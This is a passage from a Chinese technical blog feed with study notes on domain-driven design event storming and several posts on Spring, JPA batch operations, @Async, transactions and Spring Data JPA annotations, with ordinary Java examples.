能让顾客足不出户解决洗衣问题</p><h2 id="事件和命令相关的知识"><a href="#事件和命令相关的知识" class="headerlink" title="事件和命令相关的知识"></a>事件和命令相关的知识</h2><h3 id="事件风暴工作坊的参与者是谁？"><a href="#事件风暴工作坊的参与者是谁？" class="headerlink" title="事件风暴工作坊的参与者是谁？"></a>事件风暴工作坊的参与者是谁？</h3><ul><li>领域专家</li><li>用户研究⼈人员</li><li>业务⽅方案设计⼈人员 </li><li>技术专家</li><li>测试专家</li></ul><h3 id="什么是事件？"><a href="#什么是事件？" class="headerlink" title="什么是事件？"></a>什么是事件？</h3><ul><li>捕获我们所建模的领域中所发⽣生过的事情，会对系统产生影响的事情。</li></ul><h3 id="为什么要使用事件进行分析？"><a href="#为什么要使用事件进行分析？" class="headerlink" title="为什么要使用事件进行分析？"></a>为什么要使用事件进行分析？</h3><p>领域专家关⼼心的事件，业务上真实发生的事情，因为会对系统造成印象，直接关系业务逻辑。而产生事件的来源又是广泛的，所以选择事件作为系统分析切入比较合适。</p><h3 id="事件的表达方式什么？（举两个好的例子，两个坏的例子）"><a href="#事件的表达方式什么？（举两个好的例子，两个坏的例子）" class="headerlink" title="事件的表达方式什么？（举两个好的例子，两个坏的例子）"></a>事件的表达方式什么？（举两个好的例子，两个坏的例子）</h3><p>表达事件最好的方式是，描述系统的某个状态被改变。例如订单已创建。</p><h3 id="事件可以触发事件么？被触发的事件要不要贴触发源？为什么？"><a href="#事件可以触发事件么？被触发的事件要不要贴触发源？为什么？" class="headerlink" title="事件可以触发事件么？被触发的事件要不要贴触发源？为什么？"></a>事件可以触发事件么？被触发的事件要不要贴触发源？为什么？</h3><p>事件可以触发事件，事件由事件触发可以不贴触发源，因为此时没有触发源介入。</p><h3 id="事件的触发源有哪些？"><a href="#事件的触发源有哪些？" class="headerlink" title="事件的触发源有哪些？"></a>事件的触发源有哪些？</h3><ul><li>另外一个事件</li><li>系统中的命令</li></ul><h2 id="什么是命令？"><a href="#什么是命令？" class="headerlink" title="什么是命令？"></a>什么是命令？</h2><p>产生事件的某种行为，例如用户的输入。</p><h3 id="为什么需要分析命令？"><a href="#为什么需要分析命令？" class="headerlink" title="为什么需要分析命令？"></a>为什么需要分析命令？</h3><p>分析命令可以对事件的触发源进行分析，从而分析出系统中的角色（包括外部系统、定时器等隐含角色）</p><h2 id="命令有几种？（各举两个好的例子）"><a href="#命令有几种？（各举两个好的例子）" class="headerlink" title="命令有几种？（各举两个好的例子）"></a>命令有几种？（各举两个好的例子）</h2><ul><li>用户的动作<ul><li>用户提交表单</li><li>用户点击链接</li></ul></li><li>第三方系统<ul><li>第三方API</li><li>回调通知</li></ul></li><li>定时器<ul><li>计划任务</li></ul></li></ul><h3 id="角色、命令、事件，对微服务有什么意义？"><a href="#角色、命令、事件，对微服务有什么意义？" class="headerlink" title="角色、命令、事件，对微服务有什么意义？"></a>角色、命令、事件，对微服务有什么意义？</h3><p> 角色、命令、事件用于确定服务划分、服务之间的通信、以及API列表。</p><h3 id="滚动屏幕是不是命令？屏幕已滚动是不是事件？我们要不要分析？为什么？"><a href="#滚动屏幕是不是命令？屏幕已滚动是不是事件？我们要不要分析？为什么？" class="headerlink" title="滚动屏幕是不是命令？屏幕已滚动是不是事件？我们要不要分析？为什么？"></a>滚动屏幕是不是命令？屏幕已滚动是不是事件？我们要不要分析？为什么？</h3><p>是否是事件取决于是否对系统状态造成改变，如果系统不记录滚动屏幕的行为，意味着滚动屏幕是系统之外的行为。反之，如果系统需要记录用户滚动行为，例如做用户行为分析，则滚动屏幕是一个产生“用户行为已记录”事件的命令。</p><h3 id="命令跟微服务哪部分相关？"><a href="#命令跟微服务哪部分相关？" class="headerlink" title="命令跟微服务哪部分相关？"></a>命令跟微服务哪部分相关？</h3><p>命令和微服务的API有关。</p><h2 id="概念集"><a href="#概念集" class="headerlink" title="概念集"></a>概念集</h2><h3 id="什么是聚合"><a href="#什么是聚合" class="headerlink" title="什么是聚合"></a>什么是聚合</h3><p>聚合是一组相关领域模型的集合，是⽤来封装业务的不变性。通过定义对象之间清晰的所属关系和边界确保关系紧密的领域模型能够内聚在⼀一起。</p><h3 id="为什么要使用聚合？"><a href="#为什么要使用聚合？" class="headerlink" title="为什么要使用聚合？"></a>为什么要使用聚合？</h3><p>避免错综复杂的对象关系⽹网的形成，确保业务规 则在领域对象的各个生命周期都得以执⾏:</p><ul><li>聚合保证边界内的领域对象的业务不不变性</li><li>聚合内部的领域对象具有一致的生命周期</li></ul><p>确定聚合的方式：</p><ul><li>是否可以被独立访问</li><li>如果能独立访问就可以当做一个聚合否则作为外部的依赖</li></ul><h3 id="什么是聚合根？聚合根的职责是什么？"><a href="#什么是聚合根？聚合根的职责是什么？" class="headerlink" title="什么是聚合根？聚合根的职责是什么？"></a>什么是聚合根？聚合根的职责是什么？</h3><ul><li>聚合需要和外部交互，每个聚合都需要一个和外部沟通的接口，并且聚合需要一个边界。聚合根充当和外部联系的窗口，外部通过聚合根来进行交互。</li></ul><p>例如 Order(聚合根) -&gt; Order item （实体）-&gt; Comment（值对象）</p><p>外部修改每个订单项的备注，不应该在直接暴露Order item 和comment，应该Order提供接口完成。</p><h3 id="聚合根外界对象能不能直接引用聚合内对象？"><a href="#聚合根外界对象能不能直接引用聚合内对象？" class="headerlink" title="聚合根外界对象能不能直接引用聚合内对象？"></a>聚合根外界对象能不能直接引用聚合内对象？</h3><p>不能，破坏聚合的隔离性</p><h3 id="聚合内对象能不能持有其他聚合根引用？"><a href="#聚合内对象能不能持有其他聚合根引用？" class="headerlink" title="聚合内对象能不能持有其他聚合根引用？"></a>聚合内对象能不能持有其他聚合根引用？</h3><p>可以，但反过来不行。</p><h3 id="聚合根对象删除，聚合内相关对象是否可以不删除？"><a href="#聚合根对象删除，聚合内相关对象是否可以不删除？" class="headerlink" title="聚合根对象删除，聚合内相关对象是否可以不删除？"></a>聚合根对象删除，聚合内相关对象是否可以不删除？</h3><p>不可以，否则这些对象变成了游离对象，造成数据一致性破坏。</p><p>例如删除文章时，文章中的图片资源应该顺带删除。</p><h3 id="如何提取领域模型？"><a href="#如何提取领域模型？" class="headerlink" title="如何提取领域模型？"></a>如何提取领域模型？</h3><p>通过识别限界上下文来提取领域模型，识别上下文的几个原则：</p><ul><li>术语相同，含义不同。例如支付过程中的订单和购买行为中的订单不是一样的，需要进一步统一语言</li><li>概念相同，用法不同。例如进销存中的商品和购物车中的商品实际上是不同的</li><li>外部系统 明显属于领域之外的或者第三方系统提供的，例如通知、第三方支付等</li></ul><p>PS： 领域模型、子域、限界上下文这几个概念不是区分的特别清晰，请问是什么具体的关系呢？</p><h3 id="领域模型之间有几种关系？"><a href="#领域模型之间有几种关系？" class="headerlink" title="领域模型之间有几种关系？"></a>领域模型之间有几种关系？</h3><h3 id="什么是实体，什么是值对象？有什么区别？"><a href="#什么是实体，什么是值对象？有什么区别？" class="headerlink" title="什么是实体，什么是值对象？有什么区别？"></a>什么是实体，什么是值对象？有什么区别？</h3><p>实体的特征</p><ul><li>具有状态</li><li>具有ID</li><li>增删改查 需要持久化</li><li>可变</li><li>例如 order</li></ul><p>值对象</p><ul><li>对实体的属性描述</li><li>不可变</li><li>例如 Address</li></ul><p>值对象和实体可能因为业务转化。</p><h3 id="一个聚合就是一个微服务么？"><a href="#一个聚合就是一个微服务么？" class="headerlink" title="一个聚合就是一个微服务么？"></a>一个聚合就是一个微服务么？</h3><p>理想情况下是，但是需要结合现实环境。</p><h3 id="上下文相关概念"><a href="#上下文相关概念" class="headerlink" title="上下文相关概念"></a>上下文相关概念</h3><h3 id="什么是限界上下文？"><a href="#什么是限界上下文？" class="headerlink" title="什么是限界上下文？"></a>什么是限界上下文？</h3><p>业务的边界和实现业务的上下文。</p><h3 id="寻找限界上下文的四个线索是什么？"><a href="#寻找限界上下文的四个线索是什么？" class="headerlink" title="寻找限界上下文的四个线索是什么？"></a>寻找限界上下文的四个线索是什么？</h3><ul><li>基于前面输出的聚合和领域模型，判断这些领域模型要解决的业务问题，这些问题是否为同一个问题；</li><li>如果聚合解决了多个问题，应该对聚合进行拆分，然后划分到不同的上下文中。</li></ul><p>PS：剩下两个是什么呢？</p><h3 id="上下文映射中是如何确定上下游的？上下游是可以颠倒的么？"><a href="#上下文映射中是如何确定上下游的？上下游是可以颠倒的么？" class="headerlink" title="上下文映射中是如何确定上下游的？上下游是可以颠倒的么？"></a>上下文映射中是如何确定上下游的？上下游是可以颠倒的么？</h3><p>在事件风暴和命令风暴中存在时间线和依赖关系，上下文的联系是有方向的。</p><p>PS：我理解可以存在互相依赖，拿不太准确。</p><h3 id="把两个上下文集成模式有哪些？简单说明一下都是什么，各有什么自己的优点和困境，分别举一个例子。并且解释最后的策略选择矩阵。"><a href="#把两个上下文集成模式有哪些？简单说明一下都是什么，各有什么自己的优点和困境，分别举一个例子。并且解释最后的策略选择矩阵。" class="headerlink" title="把两个上下文集成模式有哪些？简单说明一下都是什么，各有什么自己的优点和困境，分别举一个例子。并且解释最后的策略选择矩阵。"></a>把两个上下文集成模式有哪些？简单说明一下都是什么，各有什么自己的优点和困境，分别举一个例子。并且解释最后的策略选择矩阵。</h3><ul><li>客户-供应方，单项依赖，例如一些专用接口（分词等）</li><li>遵奉者 下游跟随上游</li><li>共享内核 例如使用common lib的方式发布模型</li><li>开放主机/发布语言 这两种方式强相关的，例如使用Rest约定模型</li></ul><p>集成方式的两个维度分别是：</p><ul><li>团队的沟通能力</li><li>对相关系统变化的感知能力</li></ul><p>耦合程度，团队的沟通成本之间平衡。</p><h3 id="上下文和子域有什么样的关系？"><a href="#上下文和子域有什么样的关系？" class="headerlink" title="上下文和子域有什么样的关系？"></a>上下文和子域有什么样的关系？</h3><p>理想情况下是一一对应关系。</p><h3 id="上下文就是微服务么？"><a href="#上下文就是微服务么？" class="headerlink" title="上下文就是微服务么？"></a>上下文就是微服务么？</h3><p>理想状态下上下文、子域、微服务为对应关系，实际上不是，特别是微服务取决于服务的部署方式，受限于环境，可以多个子域部署到一个服务中。</p>]]></content>
      
      
      <categories>
          
          <category> 理论方法 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JPA 批量增删改</title>
      <link href="/Spring/spring/jpa-batch-operation/"/>
      <url>/Spring/spring/jpa-batch-operation/</url>
      
        <content type="html"><![CDATA[<h2 id="批量增加"><a href="#批量增加" class="headerlink" title="批量增加"></a>批量增加</h2><p>可以自定义一个 Repository 的实现，然后使用 entitymanager 的 persist 语句完成。</p><pre><code>@Override    @Transactional    public &lt;S extends T&gt; Iterable&lt;S&gt; batchSave(Iterable&lt;S&gt; var1) {        Iterator&lt;S&gt; iterator = var1.iterator();        int index = 0;        while (iterator.hasNext()){            em.persist(iterator.next());            index++;            if (index % BATCH_SIZE == 0){                em.flush();                em.clear();            }        }        if (index % BATCH_SIZE != 0){            em.flush();            em.clear();        }        return var1;    }</code></pre><p>在application.properties,设置spring.jpa.properties.hibernate.jdbc.batch_size<br>在application.properties,设置spring.jpa.properties.hibernate.generate_statistics（只是为了检查批处理是否正常）<br>在application.properties设置JDBC URL中rewriteBatchedStatements=true （特定于MySQL的优化）<br>在application.properties设置 JDBC URL中使用cachePrepStmts=true（启用缓存，如果您决定设置prepStmtCacheSize，  则也很有用  prepStmtCacheSqlLimit;等等;如果没有此设置，则禁用缓存）<br>在application.properties设置 JDBC URL中useServerPrepStmts=true（通过这种方式切换到服务器端预处理语句（可能会显着提升性能））<br>在实体中，使用指定的生成器，  因为MySQL IDENTITY将导致批处理被禁用<br>在DAO中，不时刷新并清除持久性上下文。这样，您就可以避免“压跨”持久化上下文。</p><p>不建议使用 JPQL 语句进行批量增加，会有一些奇怪的问题，实际工作中更多的使用原生 SQL 进行批量的增加。</p><h2 id="批量删除"><a href="#批量删除" class="headerlink" title="批量删除"></a>批量删除</h2><pre><code>    @Modifying    @Query(&quot;delete from Feature&quot;)    void batchDeleteAll();</code></pre><p>需要注意，在 @Query 做数据修改时，需要机上 @Modifying 注解</p><h2 id="批量更新"><a href="#批量更新" class="headerlink" title="批量更新"></a>批量更新</h2><pre><code>    @Modifying    @Query(&quot;update Feature feature set feature.name = ?1&quot;)    void batchUpdateName(String newName);</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 中 @Async注解</title>
      <link href="/Spring/spring/spring-async/"/>
      <url>/Spring/spring/spring-async/</url>
      
        <content type="html"><![CDATA[<ol><li>注解的方法必须是public方法。</li><li>方法一定要从另一个类中调用，也就是从类的外部调用，类的内部调用是无效的。</li><li>如果需要从类的内部调用，需要先获取其代理类，下面上代码</li></ol><pre><code>@Servicepublic class XxxService{  public void methodA(){    ...    XxxService xxxServiceProxy = SpringUtil.getBean(XxxService.class);    xxxServiceProxy.methodB();    ...  }  @Async  public void methodB() {    ...  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 开启事务支持</title>
      <link href="/Spring/spring/Spring%20transaction/"/>
      <url>/Spring/spring/Spring%20transaction/</url>
      
        <content type="html"><![CDATA[<p>首先使用注解 @EnableTransactionManagement 开启事务支持后，然后在访问数据库的Service方法上添加注解 @Transactional 便可</p><p>Spring boot 会自动启用一个 TransactionMannager</p><p>如果不是使用 Spring  boot 需要做如下配置</p><pre><code>@Configuration@EnableJpaRepositories@EnableTransactionManagementclass ApplicationConfig {  @Bean  public DataSource dataSource() {    EmbeddedDatabaseBuilder builder = new EmbeddedDatabaseBuilder();    return builder.setType(EmbeddedDatabaseType.HSQL).build();  }  @Bean  public LocalContainerEntityManagerFactoryBean entityManagerFactory() {    HibernateJpaVendorAdapter vendorAdapter = new HibernateJpaVendorAdapter();    vendorAdapter.setGenerateDdl(true);    LocalContainerEntityManagerFactoryBean factory = new LocalContainerEntityManagerFactoryBean();    factory.setJpaVendorAdapter(vendorAdapter);    factory.setPackagesToScan(&quot;com.acme.domain&quot;);    factory.setDataSource(dataSource());    return factory;  }  @Bean  public PlatformTransactionManager transactionManager(EntityManagerFactory entityManagerFactory) {    JpaTransactionManager txManager = new JpaTransactionManager();    txManager.setEntityManagerFactory(entityManagerFactory);    return txManager;  }}</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://blog.csdn.net/u010963948/article/details/79208328" target="_blank" rel="noopener">https://blog.csdn.net/u010963948/article/details/79208328</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring data JPA</title>
      <link href="/Spring/spring/spring-data/"/>
      <url>/Spring/spring/spring-data/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring、Spring-data-和-Spring-data-JPA-的关系"><a href="#Spring、Spring-data-和-Spring-data-JPA-的关系" class="headerlink" title="Spring、Spring data 和 Spring data JPA 的关系"></a>Spring、Spring data 和 Spring data JPA 的关系</h2><p>Spring data JPA 是 Java 服务器开发中最容易混淆的一堆概念。</p><ul><li>Spring，众所周知是一个轻量级的 IOC 容器，用来处理对象实例（Bean）之间的关系。</li><li>Spring data，是 Spring Framework 生态下用来访问数据的一个模块。</li><li>JPA，是 Java persistence API 的缩写，Java 用来抽象访问数据库的规范，主要实现有 Hibernate、TopLink 等 ORM 库。</li><li>Spirng data JPA，是 Spring data 项目的一个主要模块，用来封装 JPA 实现，并增加了一些便利的方法。如果直接使用 Hibernate 还是需要编写类似于 SQL 的 JPQL 的查询语言。但使用 Spring data JPA 可以实现类似 <code>findById()</code> 一类基本操作的方法。</li></ul><p>Spring Data 的一些属于版本火车的子项目：</p><ul><li>Spring Data Commons</li><li>Spring Data JPA</li><li>Spring Data KeyValue</li><li>Spring Data LDAP</li><li>Spring Data MongoDB</li><li>Spring Data Redis</li><li>Spring Data REST</li><li>Spring Data for Apache Cassandra</li><li>Spring Data for Apache Geode</li><li>Spring Data for Apache Solr</li><li>Spring Data for Pivotal GemFire</li><li>Spring Data Couchbase (community module)</li><li>Spring Data Elasticsearch (community module)</li><li>Spring Data Neo4j (community module)</li></ul><p>版本火车指的是，不同的独立子项目会保持同步的发布节奏，如果使用 Spring boot，也会随着 parent pom 变化，避免版本不一致导致的问题。</p><h2 id="Spring-Data-JPA-主要特性"><a href="#Spring-Data-JPA-主要特性" class="headerlink" title="Spring Data JPA 主要特性"></a>Spring Data JPA 主要特性</h2><ul><li>辅助查询 <code>findByxx</code></li><li>支持使用 Querydsl 复杂统一的查询方法</li><li>分页、排序</li><li>启动时检查 <code>@Query</code> 有效性</li></ul><h2 id="Spring-Data-JPA-的主要类"><a href="#Spring-Data-JPA-的主要类" class="headerlink" title="Spring Data JPA 的主要类"></a>Spring Data JPA 的主要类</h2><p>从 SimpleJpaRepository 的实现开，使用 idea 分析出类图。</p><p><img src="/Spring/spring/spring-data/simple-jpa-repository-diagram.png" alt="SimpleJpaRepository"></p><ul><li>EntityManagerFactory EntityManager 的工厂类</li><li>EntityManager 一个接口，管理持久化操作的对象</li><li>Entity 实体是持久性对象，对应存储在数据库中的记录</li><li>EntityTransaction 和 EntityManager 是一对一关系，提供事务支持</li><li>Persistence 包含静态方法，获取 EntityManagerFactory 实例</li><li>Query 该接口由每个 JPA 供应商提供，用于数据查询</li></ul><h2 id="快速入门教程"><a href="#快速入门教程" class="headerlink" title="快速入门教程"></a>快速入门教程</h2><p><a href="https://spring.io/guides/gs/accessing-data-jpa/" target="_blank" rel="noopener">https://spring.io/guides/gs/accessing-data-jpa/</a></p><h2 id="常见的查询方法"><a href="#常见的查询方法" class="headerlink" title="常见的查询方法"></a>常见的查询方法</h2><p>查询方法策略就是Spring Data如何从 repository 中找到合适的查询方法。有一下几种</p><ul><li>CREATE 尝试从查询方法名称构造特定于仓库的查询。例如 findByName，根据约定有以下几种查询方式：<ul><li>find…By</li><li>read…By</li><li>query…By</li><li>count…By</li><li>get…By</li></ul></li><li>USE_DECLARED_QUERY 会从 repository 中定义的方法中寻找合适的查询方式</li><li>CREATE_IF_NOT_FOUND 这是 JPA 默认的策略，组合CREATE和USE_DECLARED_QUERY</li></ul><p>CREATE 策略的几个例子：</p><pre><code>interface PersonRepository extends Repository&lt;User, Long&gt; {  List&lt;Person&gt; findByEmailAddressAndLastname(EmailAddress emailAddress, String lastname);  // Enables the distinct flag for the query  List&lt;Person&gt; findDistinctPeopleByLastnameOrFirstname(String lastname, String firstname);  List&lt;Person&gt; findPeopleDistinctByLastnameOrFirstname(String lastname, String firstname);  // Enabling ignoring case for an individual property  List&lt;Person&gt; findByLastnameIgnoreCase(String lastname);  // Enabling ignoring case for all suitable properties  List&lt;Person&gt; findByLastnameAndFirstnameAllIgnoreCase(String lastname, String firstname);  // Enabling static ORDER BY for a query  List&lt;Person&gt; findByLastnameOrderByFirstnameAsc(String lastname);  List&lt;Person&gt; findByLastnameOrderByFirstnameDesc(String lastname);}</code></pre><ul><li><p>表达式通常是属性遍历和可以连接的运算符。您可以使用组合属性表达式AND和OR。您还可以得到这样的运营商为支撑Between，LessThan，GreaterThan，和Like该属性的表达式。受支持的操作员可能因数据存储而异，因此请参阅相应部分的参考文档。</p></li><li><p>方法解析器支持IgnoreCase为单个属性（例如，findByLastnameIgnoreCase(…)）或支持忽略大小写的类型的所有属性（通常为String实例 - 例如findByLastnameAndFirstnameAllIgnoreCase(…)）设置标志。支持忽略情况的方式可能因商店而异，因此请参阅参考文档中的相关部分以获取特定于商店的查询方法。</p></li><li><p>您可以通过OrderBy向引用属性的查询方法附加子句并提供排序方向（Asc或Desc）来应用静态排序。</p></li></ul><p>分页的情况</p><pre><code>Page&lt;User&gt; findByLastname(String lastname, Pageable pageable);Slice&lt;User&gt; findByLastname(String lastname, Pageable pageable);List&lt;User&gt; findByLastname(String lastname, Sort sort);List&lt;User&gt; findByLastname(String lastname, Pageable pageable);</code></pre><h2 id="一对多级联存储"><a href="#一对多级联存储" class="headerlink" title="一对多级联存储"></a>一对多级联存储</h2><p>一对多的级联存储时，需要配置好关联关系，然后将自增ID置空即可。</p><pre><code> Feature ageFeature = new Feature();        ageFeature.setName(&quot;年龄&quot;);        ageFeature.setStep(2);        ageFeature.setFeatureValues(Arrays.asList(                new FeatureValue(null, &quot;10-20&quot;, ageFeature),                new FeatureValue(null, &quot;20-30&quot;, ageFeature)        ));        return ageFeature;</code></pre><h2 id="UUID-生成策略"><a href="#UUID-生成策略" class="headerlink" title="UUID 生成策略"></a>UUID 生成策略</h2><pre><code>    @Id    @GeneratedValue(generator = &quot;UUID&quot;)    @GenericGenerator(name = &quot;UUID&quot;, strategy = &quot;org.hibernate.id.UUIDGenerator&quot;)    private String id;</code></pre><h2 id="Entity-实例里面常用注解"><a href="#Entity-实例里面常用注解" class="headerlink" title="@Entity 实例里面常用注解"></a>@Entity 实例里面常用注解</h2><h3 id="Entity"><a href="#Entity" class="headerlink" title="@Entity"></a>@Entity</h3><p>javax.persistence 包中提供，设置该对象会被 JPA 管理，并映射到指定的数据库表。</p><p>这个类可以给一个名字。</p><h3 id="Table"><a href="#Table" class="headerlink" title="@Table"></a>@Table</h3><p>指定数据库表名</p><pre><code>// 表名，可以使用命名策略设置约定的名字String name() default &quot;&quot;;// 数据库抽象概念,用于处理table 的命名冲突String catalog() default &quot;&quot;;// 一般来说，是指数据库名String schema() default &quot;&quot;;// 唯一约束，如果不使用 JPA 自动建表不用管UniqueConstraint[] uniqueConstraints() default {};// 索引，建表时候使用，一般来说不需要Index[] indexes() default {};</code></pre><h3 id="ID"><a href="#ID" class="headerlink" title="@ID"></a>@ID</h3><p>指定为实体的主键，JPA 兼容遗留系统，使用复合主键。@IdClass </p><p>不过推荐不使用。</p><h3 id="GeneratedValue"><a href="#GeneratedValue" class="headerlink" title="@GeneratedValue"></a>@GeneratedValue</h3><p>主键生成策略 GenerationType 中定义了四种主键生成策略</p><ul><li>TABLE 通过表序列生成，框架模拟表增长</li><li>SEQUENCE 采用数据库序列增长，MySQL 不支持这种方式</li><li>IDENTITY 使用表主键的自动增长</li><li>AUTO 自动选择，默认设置选项，但不推荐使用</li></ul><h3 id="Basic"><a href="#Basic" class="headerlink" title="@Basic"></a>@Basic</h3><p>属性到数据库字段的映射，如果实体属性上没有任何注解，默认为@Basic</p><p>使用 @Basic 提供了额外懒加载的特性，对大字段非常有用</p><h3 id="Transient"><a href="#Transient" class="headerlink" title="@Transient"></a>@Transient</h3><p>设置为忽略，表明该字段不会被持久化。使用上和 @Basic 相反，JPA 映射数据库的时候选择忽略它。</p><h3 id="Column"><a href="#Column" class="headerlink" title="@Column"></a>@Column</h3><p>定义实体属性和数据库字段的列名，这个注解的参数比较多。</p><pre><code>// 列名String name() default &quot;&quot;;// 是否唯一boolean unique() default false;// 是否允许为空，用于建表时使用boolean nullable() default true;// 是否插入数据库boolean insertable() default true;// 是否运行更新数据库boolean updatable() default true;// 表名，用的比较少String table() default &quot;&quot;;// 下面三个用于创建表的属性设定int length() default 255;int precision() default 0;int scale() default 0;</code></pre><h3 id="Temporal"><a href="#Temporal" class="headerlink" title="@Temporal"></a>@Temporal</h3><p>Temporal 用于设置 Date 类型的属性到对应精度的字段。</p><ul><li>TemporalType.DATE 映射为日期</li><li>TemporalType.TIME 映射为时间</li><li>TemporalType.TIMESTAMP 映射为时间戳</li></ul><h3 id="Enumerated"><a href="#Enumerated" class="headerlink" title="Enumerated"></a>Enumerated</h3><pre><code>    @Enumerated(STRING)    private AccountRoles role;</code></pre><p>可以将字符串类型变成枚举类型，如果不使用这种方式，枚举会被自动转换为数字。如果将来发生变化，就无法映射回到正确的枚举值。需要注意的是，定义枚举时，如没有任何 valueOf的方法，在序列化和反序列化时对大小写敏感。</p><h3 id="Lob"><a href="#Lob" class="headerlink" title="@Lob"></a>@Lob</h3><p>建表时候映射为大字段</p><ul><li>如果是字符串类型会映射为 Clob 类型</li><li>如果是字节类型，会映射为 Blob</li></ul><h3 id="JoinColumn"><a href="#JoinColumn" class="headerlink" title="@JoinColumn"></a>@JoinColumn</h3><p>配合 @OneToOne、@OneToMany、ManyToOne 使用，单独使用没有意义。</p><p>@JoinColumn 多个字段的关联关系，很少用</p><h3 id="OneToOne"><a href="#OneToOne" class="headerlink" title="@OneToOne"></a>@OneToOne</h3><pre><code>// 默认当前字段的类型Class targetEntity() default void.class;// 级联操作类型CascadeType[] cascade() default {};1. CascadeType.ALL2. CascadeType.PERSIST3. CascadeType.MERGE4. CascadeType.REMOVE5. CascadeType.REFRESH6. CascadeType.DETACH// 是否懒加载FetchType fetch() default EAGER;// 是否为空 boolean optional() default true;// 配置对方拥有关系String mappedBy() default &quot;&quot;;// 是否允许级联删除boolean orphanRemoval() default false;</code></pre><p>@OneToOne 需要和 @JoinColumn(name = “solution_id”) 配合使用。</p><p>例如一个用户对应有一个头像</p><pre><code>    @OneToOne(cascade = CascadeType.ALL)    @JoinColumn(name = &quot;avatar_id&quot;)    private UserAvatar userAvatar;</code></pre><h3 id="OneToMany-和-ManyToOne"><a href="#OneToMany-和-ManyToOne" class="headerlink" title="@OneToMany 和 @ManyToOne"></a>@OneToMany 和 @ManyToOne</h3><p>这两个参数和 @OneToOne 差不多，也需要和 @JoinColumn 配合使用</p><pre><code>    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    private List&lt;FeatureValue&gt; featureValues;</code></pre><p>@OneToMany 需要额外配合使用的注解是 @OrderBy</p><p>在 @OneToMany 中，使用 @OrderBy 控制列表的顺序</p><pre><code>    @OneToMany(fetch = FetchType.EAGER, cascade = CascadeType.ALL)    @JoinColumn(name = &quot;feature_id&quot;)    @OrderBy(&quot;order DESC&quot;)    private List&lt;FeatureValue&gt; featureValues;</code></pre><h2 id="ManyToMany"><a href="#ManyToMany" class="headerlink" title="@ManyToMany"></a>@ManyToMany</h2><p>多对多一般发生在聚合根之间，其中有一个隐藏的关联表。</p><pre><code>    @ManyToMany    @JoinTable(name = &quot;product_feature_value&quot;,            joinColumns = {@JoinColumn(name = &quot;product_id&quot;, referencedColumnName = &quot;id&quot;)},            inverseJoinColumns = {@JoinColumn(name = &quot;feature_value_id&quot;, referencedColumnName = &quot;id&quot;)}    )    private List&lt;FeatureValue&gt; featureValues;</code></pre><p>一个 Product 有多个 FeatureValue，使用多对多需要引入 product_feature_value 中间表。</p><h2 id="EntityGraph-解决-N-1-条-SQL-的问题"><a href="#EntityGraph-解决-N-1-条-SQL-的问题" class="headerlink" title="@EntityGraph 解决 N+1 条 SQL 的问题"></a>@EntityGraph 解决 N+1 条 SQL 的问题</h2><p>使用一对多，多对多关联的时，会产生 N+1 条SQL，我们可以通过使用 Join 来避免这种情况。</p><p>使用 join 有三种方法</p><ul><li>@EntityGraph 在实体关联阶段解决</li><li>@Query JPQL</li><li>Criteria API 编写 JOIN 子句</li></ul><p>使用 @EntityGraph</p><p>现在实体上定义</p><pre><code>@Table(name = &quot;user&quot;)@NamedEntityGraph(name=&quot;userReadModel.department&quot;,attributeNodes={@NamedAttributeNode(&quot;department&quot;)})public class UserReadModel {    @ManyToOne    @JoinColumn(name = &quot;department_id&quot;)    private Department department;</code></pre><p>在查询的方法上使用即可</p><pre><code>@Repositorypublic interface UserReadModelRepository extends JpaRepository&lt;UserReadModel, Long&gt;,        JpaSpecificationExecutor&lt;UserReadModel&gt; {    @EntityGraph(value = &quot;userReadModel.department&quot; , type= EntityGraph.EntityGraphType.FETCH)    List&lt;UserReadModel&gt; findAll(@Nullable Specification&lt;UserReadModel&gt; spec);}</code></pre><h2 id="一些坑"><a href="#一些坑" class="headerlink" title="一些坑"></a>一些坑</h2><ol><li>@ManyToOne 如果 one 这一方不存在，会报错，即使设置了 Optional</li><li>应该使用 DDD 思想去设计关联，减少不必要的关联，聚合根之间不要关联。查询使用 join 完成</li><li>@OneToMany 关系默认懒加载会报错，应该设置为 Eager，或者使用 @Transactional 但是会带来性能开销</li><li>@OneToOne 本质上是实体和值对象的关系，统一使用实体的ID</li><li>@ManyToMany 默认会删除关联表</li><li>@Save  时候如果外键在对应表中，找不到目标记录会丢出错误,例如用户属于某个部门,拥有多个 Role</li></ol><pre><code>{  username:&quot;&quot;,  department:{    id: 1  },  roles:[    {      id:1    }  ]}</code></pre><p>当 role 的 ID 在数据库中不存在时，会报错，需要处理异常。</p><ol start="7"><li>当数据库插入异常，会报错，例如违反主键规则</li><li>更新、插入，只要不报错都会返回成功，无需再检查返回值</li></ol><h2 id="JPA-和建表规范"><a href="#JPA-和建表规范" class="headerlink" title="JPA 和建表规范"></a>JPA 和建表规范</h2><ul><li>根据 DDD 原则建表<ul><li>例如 user user_avatar user_role</li></ul></li></ul><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><ol><li>不要有一些无意义的关联</li><li>使用 NamedEntityGraph 帮我们一次抓取数据，可以明显减少 SQL 数量</li></ol><h2 id="在-Spring-data-中使用-entityManager-直接操作数据"><a href="#在-Spring-data-中使用-entityManager-直接操作数据" class="headerlink" title="在 Spring data 中使用 entityManager 直接操作数据"></a>在 Spring data 中使用 entityManager 直接操作数据</h2><pre><code>  @Autowired  EntityManager entityManager;  Role role = entityManager.find(Role.class, savedRole.getId());  assertEquals(&quot;remark&quot;, role.getRemark());</code></pre><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>示例项目 <a href="https://github.com/spring-projects/spring-data-examples/tree/master/jpa" target="_blank" rel="noopener">https://github.com/spring-projects/spring-data-examples/tree/master/jpa</a></li><li>Spring data  中文版本 <a href="https://blog.csdn.net/yongboyhood/article/details/81226553" target="_blank" 